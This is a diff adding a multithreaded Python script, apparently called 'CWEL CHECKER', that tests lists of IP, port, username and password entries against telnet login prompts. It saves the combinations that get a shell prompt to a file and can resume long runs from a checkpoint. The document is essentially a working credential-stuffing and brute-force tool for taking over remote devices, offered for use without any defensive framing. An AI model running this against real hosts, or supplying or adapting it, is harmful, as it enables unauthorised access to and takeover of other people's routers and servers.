@@ -1,0 +1,361 @@
+#!/usr/bin/python3
+import threading
+import sys, os, time, socket, signal
+from queue import Queue
+from sys import stdout
+
+# Global stats tracking
+start_time = time.time()
+total_checked = 0
+valid_credentials = 0
+invalid_credentials = 0
+timeout_errors = 0
+connection_errors = 0
+stats_lock = threading.Lock()
+last_checked_line = 0
+restore_mode = False
+
+def signal_handler(sig, frame):
+    global last_checked_line, credential_file
+    end_time = time.time()
+    total_time = end_time - start_time
+    time_per_check = total_time / max(total_checked, 1)
+    
+    # Add checkpoint marker to the credential file
+    try:
+        with open(credential_file, 'a') as f:
+            f.write(f"\n// LAST CHECKED BY CWEL CHECKER - LINE {last_checked_line}\n")
+        print(f"\n\nCheckpoint saved at line {last_checked_line}")
+    except Exception as e:
+        print(f"\nWarning: Could not save checkpoint: {e}")
+    
+    print("\n\n=== CREDENTIAL CHECK STATISTICS ===")
+    print(f"Total credentials checked: {total_checked}")
+    print(f"Valid credentials: {valid_credentials}")
+    print(f"Invalid credentials: {invalid_credentials}")
+    print(f"Connection errors: {connection_errors}")
+    print(f"Timeout errors: {timeout_errors}")
+    print(f"Total time: {total_time:.2f} seconds")
+    print(f"Time per check: {time_per_check:.3f} seconds")
+    print(f"Success rate: {(valid_credentials/max(total_checked,1)*100):.2f}%")
+    print("=====================================")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+def find_last_checkpoint(filename):
+    """Find the last checkpoint in the file and return the line number"""
+    try:
+        with open(filename, 'r') as f:
+            lines = f.readlines()
+        
+        for i in range(len(lines) - 1, -1, -1):
+            line = lines[i].strip()
+            if line.startswith("// LAST CHECKED BY CWEL CHECKER"):
+                # Extract line number from checkpoint
+                try:
+                    parts = line.split("LINE ")
+                    if len(parts) > 1:
+                        return int(parts[1].strip())
+                except:
+                    pass
+        return 0
+    except:
+        return 0
+
+def clean_checkpoint_markers(filename):
+    """Remove all checkpoint markers from the file"""
+    try:
+        with open(filename, 'r') as f:
+            lines = f.readlines()
+        
+        cleaned_lines = []
+        for line in lines:
+            if not line.strip().startswith("// LAST CHECKED BY CWEL CHECKER"):
+                cleaned_lines.append(line)
+        
+        with open(filename, 'w') as f:
+            f.writelines(cleaned_lines)
+        
+        return len(lines) - len(cleaned_lines)  # Number of markers removed
+    except Exception as e:
+        print(f"Error cleaning checkpoint markers: {e}")
+        return 0
+
+def parse_credential_line(line):
+    """Parse a line in format: IP:PORT USERNAME:PASSWORD"""
+    try:
+        line = line.strip()
+        if not line or line.startswith('#') or line.startswith('//'):
+            return None
+            
+        # Split by space to separate IP:PORT from USERNAME:PASSWORD
+        parts = line.split(' ', 1)
+        if len(parts) != 2:
+            return None
+            
+        ip_port = parts[0]
+        user_pass = parts[1]
+        
+        # Parse IP:PORT
+        if ':' not in ip_port:
+            return None
+        ip, port = ip_port.rsplit(':', 1)
+        port = int(port)
+        
+        # Parse USERNAME:PASSWORD
+        if ':' not in user_pass:
+            return None
+        username, password = user_pass.split(':', 1)
+        
+        return {
+            'ip': ip.strip(),
+            'port': port,
+            'username': username.strip(),
+            'password': password.strip()
+        }
+    except Exception:
+        return None
+    """Parse a line in format: IP:PORT USERNAME:PASSWORD"""
+    try:
+        line = line.strip()
+        if not line or line.startswith('#'):
+            return None
+            
+        # Split by space to separate IP:PORT from USERNAME:PASSWORD
+        parts = line.split(' ', 1)
+        if len(parts) != 2:
+            return None
+            
+        ip_port = parts[0]
+        user_pass = parts[1]
+        
+        # Parse IP:PORT
+        if ':' not in ip_port:
+            return None
+        ip, port = ip_port.rsplit(':', 1)
+        port = int(port)
+        
+        # Parse USERNAME:PASSWORD
+        if ':' not in user_pass:
+            return None
+        username, password = user_pass.split(':', 1)
+        
+        return {
+            'ip': ip.strip(),
+            'port': port,
+            'username': username.strip(),
+            'password': password.strip()
+        }
+    except Exception:
+        return None
+
+if len(sys.argv) < 4:
+    print("Usage: python " + sys.argv[0] + " <credential_list> <threads> <valid_output_file> [restore]")
+    print("\nInput format: IP:PORT USERNAME:PASSWORD")
+    print("Example: 192.168.1.1:23 admin:password")
+    print("\nFlags:")
+    print("  restore  - Resume checking from last checkpoint")
+    sys.exit()
+
+credential_file = sys.argv[1]
+threads = int(sys.argv[2])
+output_file = sys.argv[3]
+restore_mode = len(sys.argv) > 4 and sys.argv[4].lower() == 'restore'
+queue = Queue()
+queue_count = 0
+skip_until_line = 0
+
+# Handle restore mode
+if restore_mode:
+    print("Restore mode enabled...")
+    skip_until_line = find_last_checkpoint(credential_file)
+    if skip_until_line > 0:
+        print(f"Found checkpoint at line {skip_until_line}. Resuming from there...")
+        # Clean old checkpoint markers
+        markers_removed = clean_checkpoint_markers(credential_file)
+        if markers_removed > 0:
+            print(f"Cleaned {markers_removed} old checkpoint markers")
+    else:
+        print("No checkpoint found. Starting from beginning...")
+        restore_mode = False
+
+# Load and parse credentials
+print("Loading credentials from file...")
+current_line = 0
+with open(credential_file, "r") as f:
+    for line in f:
+        current_line += 1
+        
+        # Skip lines until we reach the checkpoint
+        if restore_mode and current_line <= skip_until_line:
+            continue
+            
+        credential = parse_credential_line(line)
+        if credential:
+            queue_count += 1
+            stdout.write("\r[%d] Added to queue" % queue_count)
+            stdout.flush()
+            queue.put({'credential': credential, 'line_number': current_line})
+
+if restore_mode and skip_until_line > 0:
+    print(f"\nResumed from line {skip_until_line}, loaded {queue_count} remaining credentials to check")
+else:
+    print(f"\nLoaded {queue_count} credentials to check")
+
+class CredentialChecker(threading.Thread):
+    def __init__(self, credential_data):
+        threading.Thread.__init__(self)
+        self.credential = credential_data['credential']
+        self.line_number = credential_data['line_number']
+        self.ip = self.credential['ip']
+        self.port = self.credential['port']
+        self.username = self.credential['username']
+        self.password = self.credential['password']
+    
+    def run(self):
+        global total_checked, valid_credentials, invalid_credentials, connection_errors, timeout_errors, stats_lock, last_checked_line
+        
+        success = False
+        error_type = "none"
+        
+        try:
+            # Create socket connection
+            tn = socket.socket()
+            tn.settimeout(10)  # Slightly longer timeout for checking
+            tn.connect((self.ip, self.port))
+            
+            try:
+                # Wait for login prompt
+                login_prompt = self.read_until(tn, "ogin:", timeout=5)
+                if "ogin" in login_prompt:
+                    tn.send((self.username + "\n").encode())
+                    time.sleep(0.1)
+                else:
+                    tn.close()
+                    error_type = "no_login_prompt"
+                    raise Exception("No login prompt")
+            except Exception:
+                tn.close()
+                error_type = "login_prompt_timeout"
+                raise Exception("Login prompt timeout")
+            
+            try:
+                # Wait for password prompt
+                password_prompt = self.read_until(tn, "assword:", timeout=5)
+                if "assword" in password_prompt:
+                    tn.send((self.password + "\n").encode())
+                    time.sleep(0.8)
+                else:
+                    tn.close()
+                    error_type = "no_password_prompt"
+                    raise Exception("No password prompt")
+            except Exception:
+                tn.close()
+                error_type = "password_prompt_timeout"
+                raise Exception("Password prompt timeout")
+            
+            try:
+                # Check for successful login indicators
+                response = tn.recv(40960).decode('utf-8', errors='ignore')
+                
+                # Success indicators
+                if (">" in response and "ONT" not in response) or \
+                   "#" in response or "$" in response or "%" in response or "@" in response:
+                    success = True
+                    
+                    # Log valid credential
+                    with open(output_file, "a") as f:
+                        f.write(f"{self.ip}:{self.port} {self.username}:{self.password}\n")
+                    
+                    print(f"\033[32m[✓] VALID -> \033[33m{self.ip}:{self.port}\033[37m \033[32m{self.username}:{self.password}\033[37m")
+                else:
+                    print(f"\033[31m[✗] INVALID -> \033[33m{self.ip}:{self.port}\033[37m \033[31m{self.username}:{self.password}\033[37m")
+                
+                tn.close()
+                
+            except Exception:
+                tn.close()
+                error_type = "response_timeout"
+                raise Exception("Response timeout")
+                
+        except socket.timeout:
+            error_type = "timeout"
+            print(f"\033[31m[T] TIMEOUT -> \033[33m{self.ip}:{self.port}\033[37m")
+        except socket.error:
+            error_type = "connection"
+            print(f"\033[31m[C] CONNECTION ERROR -> \033[33m{self.ip}:{self.port}\033[37m")
+        except Exception as e:
+            if error_type == "timeout":
+                print(f"\033[31m[T] TIMEOUT -> \033[33m{self.ip}:{self.port}\033[37m")
+            else:
+                print(f"\033[31m[E] ERROR -> \033[33m{self.ip}:{self.port}\033[37m ({error_type})")
+        
+        # Update stats (thread-safe)
+        with stats_lock:
+            total_checked += 1
+            last_checked_line = self.line_number
+            if success:
+                valid_credentials += 1
+            else:
+                invalid_credentials += 1
+                if error_type == "timeout":
+                    timeout_errors += 1
+                elif error_type == "connection":
+                    connection_errors += 1
+    
+    def read_until(self, tn, string, timeout=8):
+        """Read from socket until string is found or timeout"""
+        buf = ''
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            try:
+                data = tn.recv(1024).decode('utf-8', errors='ignore')
+                if not data:
+                    break
+                buf += data
+                time.sleep(0.01)
+                if string in buf:
+                    return buf
+            except socket.timeout:
+                break
+            except Exception:
+                break
+        raise Exception('TIMEOUT!')
+
+def worker():
+    """Worker thread function"""
+    try:
+        while True:
+            try:
+                credential = queue.get(timeout=1)
+                if credential is None:
+                    break
+                    
+                checker = CredentialChecker(credential)
+                checker.run()  # Run synchronously to avoid too many concurrent connections
+                queue.task_done()
+                time.sleep(0.05)  # Small delay between checks
+                
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+# Start worker threads
+print(f"Starting {threads} worker threads...")
+for i in range(threads):
+    try:
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+    except Exception:
+        pass
+
+# Wait for all tasks to complete
+try:
+    queue.join()
+    print("\n\nAll credentials checked!")
+    signal_handler(None, None)  # Print final stats
+except KeyboardInterrupt:
+    signal_handler(signal.SIGINT, None)
